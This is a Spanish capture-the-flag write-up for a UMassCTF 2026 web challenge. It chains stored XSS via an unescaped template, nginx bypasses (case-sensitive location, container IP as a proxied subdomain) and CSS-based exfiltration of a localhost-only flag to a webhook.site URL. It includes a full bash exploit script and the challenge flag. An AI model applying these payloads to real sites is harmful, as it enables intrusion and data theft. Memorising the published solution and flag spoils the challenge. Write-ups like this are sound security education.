# Turncoat's Treasure — UMassCTF 2026 (Web, 275pts, 76 solves)

## TL;DR
XSS en página de perfil del foro + bypass de nginx (case-sensitive location + IP directa como subdomain) + CSS exfiltration del flag desde endpoint localhost-only del bot.

## Arquitectura

```
                    ┌──────────┐
  Internet ──────►  │  nginx   │ (proxy, port 443)
                    │  proxy   │
                    └────┬─────┘
               ┌─────────┼──────────┐
               ▼         ▼          ▼
          ┌────────┐ ┌────────┐ ┌─────────┐
          │ forum  │ │product │ │ captain │
          │  :80   │ │  :80   │ │ :80/443 │
          └────────┘ └────────┘ └─────────┘
                                  │ Puppeteer bot
                                  │ /treasure (localhost-only, flag)
                                  │ /call-captain (triggers bot)
```

nginx bloquea:
- `captain.{HOST}` → server_name explícito → 403 siempre
- `location /call-captain` → 403
- `location /treasure` → 403

## Vulnerabilidades

### 1. XSS en el foro (`/user/:username`)
```html
<!-- index.html: auto-escaped (seguro) -->
{{ p.content }}

<!-- user.html: SIN ESCAPAR -->
{{ p.content | safe }}
```

### 2. Bypass nginx — case-sensitive location
```
location /call-captain { return 403; }
```
nginx location matching es **case-sensitive**. `/Call-Captain` NO matchea → pasa a `location /` → proxy_pass al upstream.

### 3. Bypass nginx — IP directa como subdomain
```nginx
server_name captain.${HOST};   # bloquea "captain"
server_name ~^(?<subdomain>.+)\.${HOST}$;  # wildcard
location / { proxy_pass http://$subdomain$request_uri; }
```

`captain.{HOST}` → 403. Pero usando la IP del container como subdomain:
```
https://10.128.5.2.{HOST}/Call-Captain
```
- `$subdomain` = `10.128.5.2` → no matchea el server_name de captain
- `proxy_pass http://10.128.5.2/Call-Captain` → llega al captain directamente
- `/Call-Captain` → no matchea `location /call-captain` (case) → Express lo rutea a `/call-captain`

IP obtenida de: `https://product.{HOST}/check-captain` (ejecuta `ping captain`)

### 4. CSS Exfiltration del flag
`/treasure` solo acepta requests desde localhost (127.0.0.1). Responde con `Content-Type: text/css`:
```
here is your treasure {name} UMASS{flag}
```

CORS bloquea `fetch()` cross-origin. Pero `<link rel=stylesheet>` NO usa CORS para cargar CSS.

Crafteamos el parámetro `name` para inyectar CSS válido con `url()`:
```
name = x{}body{background:url("https://webhook.site/UUID?f=
```

Respuesta resultante:
```css
here is your treasure x{}body{background:url("https://webhook.site/UUID?f= UMASS{flag}
```

El browser parsea:
- `here is your treasure x` → selector inválido, ignorado
- `{}` → bloque vacío
- `body { background: url("https://webhook.site/UUID?f= UMASS{flag}` → string sin cerrar, se extiende hasta EOF
- Browser hace request a `https://webhook.site/UUID?f= UMASS{flag}` → **flag exfiltrada**

## Exploit

```bash
INST="..."
HOST="${INST}.turncoatstreasure.web.ctf.umasscybersec.org"
FORUM="https://forum.${HOST}"
WEBHOOK="https://webhook.site/TOKEN"

# 1. Obtener IP del captain
CAPTAIN_IP=$(curl -sk "https://product.${HOST}/check-captain" | grep -oP '\d+\.\d+\.\d+\.\d+' | head -1)

# 2. Registrar usuario en el foro
USER="exploit_$(date +%s)"
curl -sk "${FORUM}/register" -d "username=${USER}&password=p"
TOKEN=$(curl -sk -D - "${FORUM}/login" -d "username=${USER}&password=p" | grep -oP 'token=\K[^;]+')

# 3. Postear XSS (CSS exfil via <link> tag)
TREASURE_URL="https://localhost/treasure?name=x%7B%7Dbody%7Bbackground%3Aurl%28%22${WEBHOOK}%3Ff%3D"
XSS="<link rel=stylesheet href='${TREASURE_URL}'>"
curl -sk "${FORUM}/post" -b "token=${TOKEN}" --data-urlencode "content=${XSS}"

# 4. Triggear bot via IP + case bypass
curl -sk "https://${CAPTAIN_IP}.${HOST}/Call-Captain?endpoint=/user/${USER}"

# 5. Leer flag en webhook.site
```

## Flag
```
UMASS{s0m3body_t0uch3d_th3_tre45ur3_0mg_th4ts_cr4zy}
```

## Key Lessons
- nginx `location` matching es case-sensitive → bypass trivial con case diferente
- `proxy_pass http://$subdomain$request_uri` con subdomain desde Host header → SSRF a IPs internas
- `<link rel=stylesheet>` carga CSS cross-origin sin CORS → exfiltración de datos en respuestas `text/css`
- CSS unterminated strings (`url("...` sin cerrar) → el browser aún intenta resolver la URL
